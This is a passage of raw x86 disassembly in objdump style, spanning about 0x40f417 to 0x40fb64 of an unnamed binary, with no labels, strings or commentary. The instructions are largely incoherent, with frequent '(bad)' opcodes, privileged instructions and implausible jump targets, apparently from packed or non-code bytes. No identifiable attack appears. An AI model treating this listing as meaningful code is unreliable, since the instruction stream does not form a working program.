  40f417:	xor    BYTE PTR [ebp-0x1],al
  40f41a:	mov    DWORD PTR [ebp-0x36df38],ecx
  40f420:	push   cs
  40f421:	push   eax
  40f422:	jne    0x40f469
  40f424:	mov    esi,DWORD PTR [ebx]
  40f426:	sbb    al,0x3
  40f428:	jne    0x40f47a
  40f42a:	inc    DWORD PTR [ebp-0x75]
  40f42d:	add    eax,0x800f0
  40f432:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  40f438:	mov    DWORD PTR [ecx],eax
  40f43a:	sbb    BYTE PTR [eax],al
  40f43c:	leave  
  40f43d:	test   DWORD PTR [edi-0x1],eax
  40f440:	jne    0x40f441
  40f442:	call   0xff41df47
  40f447:	xor    BYTE PTR [ebp+0x4d],al
  40f44a:	mov    edi,edi
  40f44c:	enter  0x8,0x4d
  40f450:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  40f456:	mov    eax,DWORD PTR [eax]
  40f458:	sbb    al,0x1
  40f45a:	sbb    DWORD PTR [ebp+0x4d],eax
  40f45d:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  40f463:	inc    eax
  40f464:	dec    DWORD PTR [ecx-0x27d775]
  40f46a:	add    BYTE PTR [ebx-0x38d72b01],cl
  40f470:	xchg   ecx,eax
  40f471:	ret    
  40f472:	add    BYTE PTR [ebp-0x830075],al
  40f478:	add    BYTE PTR [ebp-0x75],al
  40f47b:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  40f481:	lea    edi,[edi+0x20]
  40f484:	add    bh,bh
  40f486:	mov    edx,DWORD PTR [eax-0x7b]
  40f489:	inc    ebp
  40f48a:	rdpmc  
  40f48c:	jne    0x40f491
  40f48e:	add    BYTE PTR [eax-0x75],dl
  40f491:	inc    ebp
  40f492:	call   0x4040fd9c
  40f497:	add    BYTE PTR [ecx-0xe3d775],cl
  40f49d:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  40f4a4:	ret    
  40f4a5:	inc    DWORD PTR [ebp-0xff0001]
  40f4ab:	add    BYTE PTR [ebp-0x4b],al
  40f4ae:	cmp    edi,0x24
  40f4b1:	(bad)  
  40f4b2:	push   DWORD PTR [eax]
  40f4b4:	add    BYTE PTR [ebp-0x39],dl
  40f4b7:	test   ebx,eax
  40f4b9:	je     0x40f440
  40f4bb:	mov    edi,edi
  40f4bd:	sbb    bh,bh
  40f4bf:	test   DWORD PTR gs:[eax],eax
  40f4c2:	(bad)  
  40f4c3:	js     0x40f4c4
  40f4c5:	add    BYTE PTR [ebx-0x38b21fdd],cl
  40f4cb:	sub    eax,ebx
  40f4cd:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  40f4d3:	add    eax,DWORD PTR [eax]
  40f4d5:	dec    ebp
  40f4d6:	push   eax
  40f4d7:	mov    al,BYTE PTR [ebp+0x1]
  40f4da:	mov    eax,DWORD PTR [ebp-0x68]
  40f4dd:	mov    eax,DWORD PTR [eax]
  40f4df:	cld    
  40f4e0:	(bad)  
  40f4e1:	or     BYTE PTR [eax],ah
  40f4e3:	dec    ebp
  40f4e4:	inc    DWORD PTR [eax+0x4]
  40f4e7:	push   ecx
  40f4e8:	add    BYTE PTR [edx-0x1],dh
  40f4eb:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  40f4f1:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  40f4fb:	add    ecx,DWORD PTR [ecx-0xf037477]
  40f501:	push   ecx
  40f502:	xor    BYTE PTR [ebx],al
  40f504:	inc    ebp
  40f505:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  40f50b:	(bad)  
  40f50c:	push   eax
  40f50e:	inc    DWORD PTR [eax]
  40f510:	inc    ebp
  40f511:	add    BYTE PTR [ebx],dh
  40f513:	add    BYTE PTR [ebx],0x0
  40f516:	mov    DWORD PTR [ebx-0x150007d4],eax
  40f51c:	lea    edx,[ebp-0x6c]
  40f51f:	je     0x40f4a6
  40f521:	(bad)  
  40f522:	dec    DWORD PTR [eax]
  40f524:	call   DWORD PTR [ebp-0x7b]
  40f527:	mov    edi,edi
  40f529:	hlt    
  40f52a:	call   DWORD PTR [ebp-0x75]
  40f52d:	mov    esp,eax
  40f52f:	cwde   
  40f530:	(bad)  
  40f531:	mov    bh,0xc3
  40f533:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  40f539:	add    DWORD PTR [eax],0x450050ff
  40f53f:	mov    DWORD PTR [ebx+0x9598c8],ecx
  40f545:	inc    edi
  40f547:	jmp    DWORD PTR [eax]
  40f549:	jmp    0xcd00:0x650481ff
  40f550:	mov    DWORD PTR [ebx],esi
  40f552:	and    al,0x81
  40f554:	(bad)  
  40f555:	cmp    al,0xff
  40f557:	pushf  
  40f558:	push   DWORD PTR [ebp+0x8]
  40f55b:	mov    eax,eax
  40f55d:	add    esi,DWORD PTR [eax]
  40f55f:	enter  0x3c45,0x83
  40f563:	add    ah,bh
  40f565:	adc    DWORD PTR [ebx+0x768b5055],eax
  40f56b:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  40f571:	mov    esi,eax
  40f573:	xor    BYTE PTR [ebp+0x45],cl
  40f576:	jmp    0x40f503
  40f578:	mov    ebx,DWORD PTR [eax]
  40f57a:	in     al,dx
  40f57b:	inc    ebp
  40f57c:	or     al,0x2
  40f57e:	dec    DWORD PTR [ebp-0x4]
  40f581:	jne    0x40f5d8
  40f583:	mov    ecx,DWORD PTR [eax+0x18558be8]
  40f589:	mov    edi,DWORD PTR [ebx]
  40f58b:	lock push eax
  40f58d:	xchg   ecx,eax
  40f58e:	jmp    0x3414393
  40f593:	adc    al,0x8b
  40f595:	inc    ebp
  40f596:	mov    al,ds:0x8b04008b
  40f59b:	push   ebp
  40f59c:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  40f5a2:	push   ebp
  40f5a3:	test   DWORD PTR [ebx-0x2900d701],ecx
  40f5a9:	inc    ebp
  40f5aa:	dec    ebp
  40f5ab:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  40f5b1:	mov    DWORD PTR [eax],0xe9ff0020
  40f5b7:	add    al,0x0
  40f5b9:	add    BYTE PTR [eax],al
  40f5bb:	mov    eax,edx
  40f5bd:	push   eax
  40f5be:	rol    DWORD PTR [ebp-0xb0077],1
  40f5c4:	bound  eax,QWORD PTR [ebp+0x50]
  40f5c7:	xor    ecx,DWORD PTR [ecx+0x55899803]
  40f5cd:	sub    al,0x89
  40f5cf:	push   esp
  40f5d1:	lea    edx,[ebp-0x6c]
  40f5d4:	jne    0xffd6f4ec
  40f5da:	inc    DWORD PTR [ebp-0x1d0001]
  40f5e0:	jnp    0xc796d5e6
  40f5e6:	mov    eax,ebx
  40f5e8:	fs mov edi,edi
  40f5eb:	sbb    al,0xc1
  40f5ed:	out    dx,al
  40f5ee:	or     al,0x0
  40f5f0:	ret    0x8d50
  40f5f3:	inc    ebp
  40f5f4:	dec    DWORD PTR [ebx+0xfa98d7]
  40f5fa:	test   edi,edi
  40f5fc:	clc    
  40f5fd:	call   FWORD PTR [edi]
  40f5ff:	or     BYTE PTR [eax],cl
  40f601:	inc    ebp
  40f602:	dec    ebp
  40f603:	inc    DWORD PTR [ebx+0x74803114]
  40f609:	add    DWORD PTR [ebx+0x45fc00],ecx
  40f60f:	call   DWORD PTR [eax+edx*1]
  40f612:	add    ecx,DWORD PTR [ebp-0x38]
  40f615:	push   esi
  40f616:	adc    al,0x8
  40f618:	mov    edx,DWORD PTR [ebp-0x14]
  40f61b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f61e:	add    DWORD PTR [ebp-0x68],0xffffff8d
  40f622:	inc    DWORD PTR [esp+esi*8]
  40f625:	inc    ebp
  40f626:	stos   BYTE PTR es:[edi],al
  40f627:	mov    edx,DWORD PTR [ebp+0x1c]
  40f62a:	add    DWORD PTR [ebp-0x10],eax
  40f62d:	mov    edx,DWORD PTR [ebp-0x70]
  40f630:	cmp    eax,DWORD PTR [eax]
  40f632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f633:	mov    eax,DWORD PTR [eax]
  40f635:	sbb    al,0x73
  40f637:	add    BYTE PTR [ebx],0x1
  40f63a:	call   0x8971463f
  40f63f:	xor    eax,ebp
  40f641:	pop    ds
  40f642:	inc    ebp
  40f643:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  40f649:	(bad)  
  40f64a:	push   DWORD PTR [edi]
  40f64c:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  40f652:	push   DWORD PTR [ebx-0x1]
  40f655:	mov    eax,DWORD PTR [ebp-0x740075]
  40f65b:	sub    eax,DWORD PTR [eax]
  40f65d:	add    eax,DWORD PTR [eax]
  40f65f:	mov    DWORD PTR [ecx+0x5f],eax
  40f662:	mov    DWORD PTR [ebx+0x28],ebx
  40f665:	ret    0xff
  40f668:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  40f66e:	ret    
  40f66f:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f675:	add    BYTE PTR [ebp-0x7d],al
  40f678:	mov    DWORD PTR [eax],eax
  40f67a:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  40f681:	sar    bh,cl
  40f683:	test   BYTE PTR [eax+0x1],dl
  40f686:	inc    ebp
  40f687:	add    BYTE PTR [ebx],dh
  40f689:	test   BYTE PTR [ebx],0x84
  40f68c:	push   eax
  40f68d:	add    BYTE PTR [ebp+0x0],al
  40f690:	add    eax,0x86
  40f695:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f69b:	add    BYTE PTR [ecx],al
  40f69d:	add    BYTE PTR [eax],al
  40f69f:	mov    esi,0x550030
  40f6a4:	mov    ecx,DWORD PTR [edi]
  40f6a6:	sbb    al,0xda
  40f6a8:	jne    0x40f6aa
  40f6aa:	mov    edi,DWORD PTR [ecx]
  40f6ac:	xor    BYTE PTR [eax+eax*1],0x84
  40f6b0:	add    eax,DWORD PTR [eax]
  40f6b2:	cld    
  40f6b3:	add    BYTE PTR [ebp-0x4f],dh
  40f6b6:	mov    eax,DWORD PTR [ecx]
  40f6b8:	cld    
  40f6b9:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f6bf:	retf   0xe45
  40f6c2:	add    eax,edx
  40f6c4:	sbb    al,0xb7
  40f6c6:	dec    ebp
  40f6c7:	or     al,0x89
  40f6c9:	dec    ebp
  40f6ca:	sbb    al,0xf
  40f6cc:	inc    ebp
  40f6cd:	dec    eax
  40f6ce:	mov    eax,DWORD PTR [ebx]
  40f6d0:	sbb    al,0xf
  40f6d2:	nop
  40f6d3:	scas   al,BYTE PTR es:[edi]
  40f6d4:	add    DWORD PTR [eax],eax
  40f6d6:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f6dc:	mov    eax,gs
  40f6de:	add    bh,bh
  40f6e0:	mov    edi,edi
  40f6e2:	cmp    DWORD PTR [edi+0x72],edx
  40f6e5:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f6eb:	gs cmp al,0x0
  40f6ee:	je     0x40f6c6
  40f6f0:	push   eax
  40f6f1:	sar    BYTE PTR [eax],1
  40f6f3:	mov    bh,0x3e
  40f6f5:	push   cs
  40f6f6:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f6fc:	add    DWORD PTR [ecx+0x12],ebp
  40f6ff:	dec    edx
  40f700:	(bad)  
  40f701:	mov    eax,edx
  40f703:	in     al,dx
  40f704:	adc    DWORD PTR [ecx],esi
  40f706:	pop    esi
  40f707:	inc    ecx
  40f708:	leave  
  40f709:	or     DWORD PTR [eax],ebx
  40f70b:	gs push ebp
  40f70d:	add    ah,ch
  40f70f:	into   
  40f710:	in     al,dx
  40f711:	enter  0xb756,0xf0
  40f715:	push   cs
  40f716:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f720:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f726:	jnp    0x74417c2e
  40f72c:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f732:	add    BYTE PTR [edi],cl
  40f734:	mov    edi,DWORD PTR [ecx-0x78]
  40f737:	ltr    WORD PTR [ecx-0x7b]
  40f73b:	dec    DWORD PTR [edi]
  40f73d:	clc    
  40f73e:	out    0x45,eax
  40f740:	add    BYTE PTR [eax],cl
  40f742:	cmp    ebx,0xffffff8c
  40f745:	jge    0x40f747
  40f747:	jb     0x40f759
  40f749:	je     0x4ff7c9
  40f74f:	pop    edx
  40f750:	push   esi
  40f751:	mov    ecx,DWORD PTR [edi]
  40f753:	in     al,dx
  40f754:	rol    DWORD PTR [ebp+0x0],1
  40f757:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f75e:	cmp    DWORD PTR [ecx],0xfffffff0
  40f761:	hlt    
  40f762:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f768:	(bad)  
  40f76a:	push   eax
  40f76b:	jns    0xb840dbe9
  40f771:	lock push cs
  40f773:	ror    edx,0x3
  40f776:	test   BYTE PTR [ecx+0x5500e800],cl
  40f77c:	dec    eax
  40f77d:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f781:	(bad)  
  40f782:	mov    esi,0x7f33ff5f
  40f787:	inc    eax
  40f788:	test   DWORD PTR [edx],eax
  40f78a:	je     0x40f74c
  40f78c:	mov    ecx,ecx
  40f78e:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f792:	and    eax,DWORD PTR [eax+0xf0103]
  40f798:	jp     0x40f786
  40f79a:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f79e:	add    edx,DWORD PTR [edi+0x74]
  40f7a1:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f7a7:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f7ad:	je     0x40f732
  40f7af:	cmp    eax,edi
  40f7b1:	js     0x40f7d6
  40f7b3:	add    eax,0xeb0fc003
  40f7b8:	jns    0x40f745
  40f7ba:	vmread DWORD PTR [ecx+0x45],ebx
  40f7be:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f7c4:	adc    al,0x8b
  40f7c6:	jge    0x40f7dc
  40f7c8:	mov    edi,DWORD PTR [eax-0x4]
  40f7cb:	add    edi,DWORD PTR [edi]
  40f7cd:	or     bh,bh
  40f7cf:	push   ebp
  40f7d0:	push   es
  40f7d1:	mov    DWORD PTR [ebp-0x4],ebx
  40f7d4:	add    edi,esi
  40f7d6:	pop    es
  40f7d7:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f7dd:	mov    DWORD PTR [esp+esi*8],ecx
  40f7e0:	inc    ebp
  40f7e1:	pop    ebp
  40f7e2:	xor    DWORD PTR [esi-0x4],0x3b
  40f7e6:	add    edx,DWORD PTR [ecx+edi*1]
  40f7e9:	push   es
  40f7ea:	clc    
  40f7eb:	mov    bh,0xdb
  40f7ed:	jp     0x40f7a6
  40f7ef:	add    cl,BYTE PTR [esi]
  40f7f1:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f7f7:	test   edi,edi
  40f7f9:	je     0x40f7ef
  40f7fb:	mov    eax,ecx
  40f7fd:	or     BYTE PTR [ebx],al
  40f7ff:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f805:	jbe    0x40f879
  40f807:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f80d:	add    ecx,DWORD PTR [esi]
  40f80f:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f815:	add    eax,DWORD PTR [ebx-0x287af783]
  40f81b:	je     0x40f86a
  40f81d:	mov    DWORD PTR [ecx],edi
  40f81f:	mov    esi,eax
  40f821:	hlt    
  40f822:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f829:	jb     0x40f7eb
  40f82b:	jmp    0x40f818
  40f82d:	xor    esi,DWORD PTR [ebx]
  40f82f:	pop    edi
  40f830:	pop    esi
  40f831:	pop    ebx
  40f832:	ret    
  40f833:	ret    0x8b
  40f836:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f83c:	xor    DWORD PTR [ecx],0xc
  40f83f:	pushf  
  40f840:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  40f846:	rdmsr  
  40f848:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  40f84f:	dec    ebp
  40f850:	ret    
  40f851:	mov    edi,DWORD PTR [esi-0x4]
  40f854:	pop    eax
  40f855:	dec    ebp
  40f856:	jne    0x40f7e3
  40f858:	xor    edi,esp
  40f85a:	inc    eax
  40f85b:	dec    ebp
  40f85c:	jbe    0x40f8b1
  40f85e:	inc    eax
  40f85f:	pop    ebp
  40f860:	add    edx,DWORD PTR [esi+0x8]
  40f863:	push   esp
  40f864:	dec    eax
  40f865:	push   ecx
  40f866:	mov    eax,edi
  40f868:	and    al,0xf0
  40f86a:	jo     0x40f857
  40f86c:	mov    eax,DWORD PTR [ebx]
  40f86e:	sbb    BYTE PTR [ebp+0x4d],cl
  40f871:	mov    eax,DWORD PTR [ebx]
  40f873:	nop
  40f874:	or     BYTE PTR [eax],al
  40f876:	jne    0x40f8cf
  40f878:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  40f87e:	cld    
  40f87f:	xor    edi,edi
  40f881:	add    edi,DWORD PTR [ebp+0x3]
  40f884:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f88a:	js     0x40f810
  40f88c:	jae    0x40f890
  40f88e:	(bad)  
  40f890:	xor    al,0x5d
  40f892:	jmp    0x40f81f
  40f894:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f89b:	fdecstp 
  40f89d:	test   BYTE PTR [edi],ah
  40f89f:	add    bh,BYTE PTR [ebp+0x0]
  40f8a2:	add    ebx,DWORD PTR [ebp-0x77]
  40f8a5:	mov    edi,eax
  40f8a7:	cmp    al,0x0
  40f8aa:	adc    dh,BYTE PTR [ebx]
  40f8ac:	jge    0x40f8b1
  40f8ae:	mov    edi,DWORD PTR [ebx]
  40f8b0:	jl     0x40f8c1
  40f8b2:	clc    
  40f8b3:	dec    edi
  40f8b4:	jge    0x40f8b6
  40f8b6:	mov    eax,DWORD PTR [ebx]
  40f8b8:	jb     0x40f8c2
  40f8ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f8bd:	mov    edi,edi
  40f8bf:	xor    edx,DWORD PTR [eax]
  40f8c1:	add    edi,DWORD PTR [ebx]
  40f8c3:	mov    DWORD PTR [ebp-0x10],edi
  40f8c6:	inc    edi
  40f8c7:	pop    ebp
  40f8c8:	jge    0x40f905
  40f8ca:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40f8ce:	mov    edx,0xc05d87f0
  40f8d3:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40f8d7:	fimul  WORD PTR [eax]
  40f8d9:	fist   WORD PTR [ebp+0x1c]
  40f8dc:	in     al,dx
  40f8dd:	jne    0x40f8cb
  40f8df:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40f8e5:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40f8e9:	fdivp  st(0),st
  40f8eb:	fild   WORD PTR [ebp+0x4510f85c]
  40f8f1:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40f8f7:	inc    ebp
  40f8f8:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40f8fe:	mov    ebp,DWORD PTR [ebx-0x4]
  40f901:	adc    al,0x8b
  40f903:	rcl    DWORD PTR [eax],0x48
  40f906:	mov    esi,0x7080803
  40f90b:	fiadd  WORD PTR [ebp+0x4d]
  40f90e:	(bad)  
  40f90f:	mov    edx,DWORD PTR [edx-0x4]
  40f912:	mov    edx,DWORD PTR [ebp-0x4]
  40f915:	xor    ebx,DWORD PTR [ebx+0x330103]
  40f91b:	mov    DWORD PTR [edi+0x872dc],edi
  40f921:	xlat   BYTE PTR ds:[ebx]
  40f922:	into   
  40f923:	ffreep st(6)
  40f925:	retf   0x6c7
  40f928:	iret   
  40f929:	dec    ebp
  40f92a:	inc    ebp
  40f92b:	mov    DWORD PTR [ebx],edi
  40f92d:	fmul   QWORD PTR [edi]
  40f92f:	dec    ebp
  40f930:	jnp    0x40f965
  40f932:	add    BYTE PTR [ebx],al
  40f934:	mov    ecx,DWORD PTR [esp+edi*8]
  40f937:	inc    ebp
  40f938:	dec    ebp
  40f939:	lea    esi,[ebx]
  40f93b:	add    DWORD PTR [ebx],eax
  40f93d:	jb     0x40f97a
  40f93f:	add    BYTE PTR [edi],cl
  40f941:	inc    ebp
  40f942:	imul   eax,edi,0x858bd800
  40f948:	cld    
  40f949:	clc    
  40f94a:	mov    DWORD PTR [ebp+0x0],eax
  40f94d:	inc    DWORD PTR [eax]
  40f94f:	or     al,0xde
  40f951:	sbb    bh,0x1
  40f954:	retf   
  40f955:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40f95c:	dec    ebp
  40f95d:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40f963:	enter  0x12de,0xdf
  40f967:	inc    ebp
  40f968:	pop    ebp
  40f969:	dec    DWORD PTR [ebx-0x257f0ff4]
  40f96f:	add    DWORD PTR [edx],edx
  40f971:	add    BYTE PTR [ebp+0x50],dl
  40f974:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40f97a:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40f980:	or     ah,al
  40f982:	pop    ss
  40f983:	cdq    
  40f984:	push   ebp
  40f985:	clc    
  40f986:	mov    eax,DWORD PTR [ebp-0x4]
  40f989:	xor    edx,edx
  40f98b:	add    esi,DWORD PTR [ebx]
  40f98d:	cmp    eax,DWORD PTR [ebx]
  40f98f:	hlt    
  40f990:	cmp    DWORD PTR [ebx],esp
  40f992:	or     al,BYTE PTR [ebp+0xf]
  40f995:	mov    eax,DWORD PTR [edx]
  40f997:	loopne 0x40f999
  40f999:	(bad)  
  40f99a:	mov    ecx,esi
  40f99c:	cld    
  40f99d:	pushf  
  40f99e:	pop    ebp
  40f99f:	fwait
  40f9a0:	mov    esi,DWORD PTR [edx]
  40f9a2:	lock mov eax,eax
  40f9a5:	adc    BYTE PTR [ebx],al
  40f9a7:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40f9ae:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40f9b4:	dec    ebp
  40f9b5:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40f9bb:	(bad)  
  40f9bc:	iret   
  40f9bd:	inc    ebp
  40f9be:	(bad)  
  40f9bf:	jne    0x40fa0e
  40f9c1:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40f9c7:	(bad)  
  40f9c8:	cmp    ebx,eax
  40f9ca:	je     0x40f952
  40f9cc:	add    edi,edi
  40f9ce:	or     bh,bh
  40f9d0:	dec    ebp
  40f9d1:	inc    ebp
  40f9d2:	mov    esi,DWORD PTR [ebx]
  40f9d4:	cld    
  40f9d5:	add    ecx,esi
  40f9d7:	cmp    ecx,DWORD PTR [eax-0xc]
  40f9da:	mov    edx,DWORD PTR [edi]
  40f9dc:	or     BYTE PTR [ebp-0x7c],al
  40f9df:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  40f9e5:	test   BYTE PTR [ebx+ebx*4],cl
  40f9e8:	inc    ebp
  40f9e9:	xor    bh,BYTE PTR [esi]
  40f9eb:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  40f9f2:	jne    0x40f9bb
  40f9f4:	mov    ebp,esp
  40f9f6:	fcomp  DWORD PTR [ebx]
  40f9f8:	add    BYTE PTR [ecx],al
  40f9fa:	inc    DWORD PTR [ebp-0x75]
  40f9fd:	(bad)  
  40f9fe:	cld    
  40f9ff:	add    al,0xce
  40fa01:	mov    ecx,edi
  40fa03:	cld    
  40fa04:	inc    ebp
  40fa05:	fidivr WORD PTR [ebx]
  40fa07:	fbstp  TBYTE PTR [ebp-0x3e]
  40fa0a:	mov    eax,DWORD PTR [eax]
  40fa0c:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fa12:	fadd   st,st(7)
  40fa14:	add    BYTE PTR [ebp-0x1],al
  40fa17:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa1a:	inc    ebp
  40fa1b:	mov    bh,0xc7
  40fa1e:	loopne 0x40fa65
  40fa20:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fa26:	sbb    dh,BYTE PTR [ebx]
  40fa28:	pushf  
  40fa29:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fa2f:	mov    eax,edi
  40fa31:	cwde   
  40fa32:	inc    ebp
  40fa33:	inc    ebp
  40fa34:	jne    0x40f9c1
  40fa36:	mov    esp,esp
  40fa38:	clc    
  40fa39:	add    al,0x4d
  40fa3b:	mov    DWORD PTR [ebx],esi
  40fa3d:	or     al,0x33
  40fa3f:	inc    ebp
  40fa40:	lea    ecx,[ebx-0x398d13fd]
  40fa46:	add    bh,al
  40fa48:	inc    ebp
  40fa49:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fa50:	add    ebp,esp
  40fa52:	shufps xmm1,xmm3,0xc7
  40fa56:	(bad)  
  40fa57:	jmp    0x74863580
  40fa5c:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fa62:	hlt    
  40fa63:	mov    ecx,DWORD PTR [edi]
  40fa65:	fadd   DWORD PTR [ebp+0x0]
  40fa68:	xor    ecx,DWORD PTR [edi]
  40fa6a:	add    ecx,ecx
  40fa6c:	cmp    edi,edi
  40fa6e:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fa72:	(bad)  
  40fa73:	jmp    0x40fa00
  40fa75:	mov    edi,esp
  40fa77:	or     al,0xc6
  40fa79:	inc    ebp
  40fa7a:	(bad)  
  40fa7b:	mov    eax,DWORD PTR [ebp+0x10]
  40fa7e:	jne    0x40fa09
  40fa80:	mov    eax,DWORD PTR [ecx]
  40fa82:	clc    
  40fa83:	add    BYTE PTR [ebp-0x40],cl
  40fa86:	xor    edx,DWORD PTR [eax-0x73]
  40fa89:	jne    0x40fa8c
  40fa8b:	push   DWORD PTR [edx+0x8]
  40fa8e:	add    BYTE PTR [ebp+0x45],al
  40fa91:	mov    ebp,ecx
  40fa93:	cld    
  40fa94:	add    BYTE PTR [ebp+0x0],cl
  40fa97:	xor    eax,DWORD PTR [ebp+0x3]
  40fa9a:	mov    DWORD PTR [ebx],edi
  40fa9c:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40faa2:	sub    eax,0x5d330e4d
  40faa7:	lea    esi,[ebx]
  40faa9:	add    DWORD PTR [ebx],eax
  40faab:	jb     0x40fa96
  40faad:	add    BYTE PTR [eax],al
  40faaf:	inc    ebp
  40fab0:	add    bl,ch
  40fab2:	inc    ebp
  40fab3:	mov    esi,DWORD PTR [ebx]
  40fab5:	or     al,0x3
  40fab7:	(bad)  
  40fab8:	mov    edi,eax
  40faba:	in     al,dx
  40fabb:	scas   eax,DWORD PTR es:[edi]
  40fabc:	inc    ebp
  40fabd:	mov    esi,DWORD PTR [ebx]
  40fabf:	in     al,0x3
  40fac1:	add    al,0x89
  40fac3:	mov    ecx,DWORD PTR [eax+edi*8]
  40fac6:	dec    ebp
  40fac7:	(bad)  
  40fac8:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  40facf:	mov    ecx,eax
  40fad1:	cld    
  40fad2:	push   es
  40fad3:	dec    ebp
  40fad4:	add    al,0x33
  40fad6:	mov    DWORD PTR [ebx],eax
  40fad8:	in     al,dx
  40fad9:	cmp    DWORD PTR [ebp-0x67],eax
  40fadc:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fae2:	mov    edx,DWORD PTR [ebp-0x4]
  40fae5:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fae8:	xor    eax,DWORD PTR [ebp+0x3]
  40faeb:	cmp    DWORD PTR [ebx],0x8b32749a
  40faf1:	xor    edi,esp
  40faf3:	jmp    0xff74f845
  40faf8:	add    ecx,DWORD PTR [ebp-0x3f]
  40fafb:	xor    ebx,DWORD PTR [edi]
  40fafd:	add    eax,ecx
  40faff:	cmp    ebx,DWORD PTR [eax]
  40fb01:	mov    ecx,DWORD PTR [ebp-0x4]
  40fb04:	mov    ecx,DWORD PTR [eax]
  40fb06:	adc    BYTE PTR [ebp-0x80],al
  40fb09:	jmp    0x40fb0c
  40fb0b:	mov    eax,DWORD PTR [eax]
  40fb0d:	cld    
  40fb0e:	mov    bh,0xc6
  40fb10:	push   ecx
  40fb11:	(bad)  
  40fb12:	jne    0x40fb72
  40fb14:	dec    ecx
  40fb16:	or     BYTE PTR [ecx+ebx*1],cl
  40fb19:	push   ebp
  40fb1a:	inc    ebp
  40fb1b:	in     al,dx
  40fb1c:	add    ebp,esp
  40fb1e:	or     bh,al
  40fb20:	dec    ebp
  40fb21:	cld    
  40fb22:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fb28:	xor    DWORD PTR [edx],0x2
  40fb2b:	pushf  
  40fb2c:	dec    DWORD PTR [ebx+0x45510cf4]
  40fb32:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  40fb38:	mov    edx,DWORD PTR [ecx+0xc]
  40fb3b:	xor    eax,esi
  40fb3d:	mov    edx,0xc172c7
  40fb42:	inc    ebp
  40fb43:	mov    esi,DWORD PTR [ebp+0x8]
  40fb46:	mov    eax,edx
  40fb48:	call   0x84c5c23d
  40fb4d:	add    DWORD PTR [ebx-0x76bace00],ebx
  40fb53:	mov    ebp,eax
  40fb55:	or     BYTE PTR [eax],dl
  40fb57:	jo     0x40fba6
  40fb59:	push   edi
  40fb5a:	xor    esi,DWORD PTR [ebp+0x3]
  40fb5d:	(bad)  
  40fb5e:	pmulhuw mm0,mm1
  40fb61:	test   DWORD PTR [ebp-0x8],ecx
  40fb64:	mov    DWORD PTR [ebp-0x67],eax
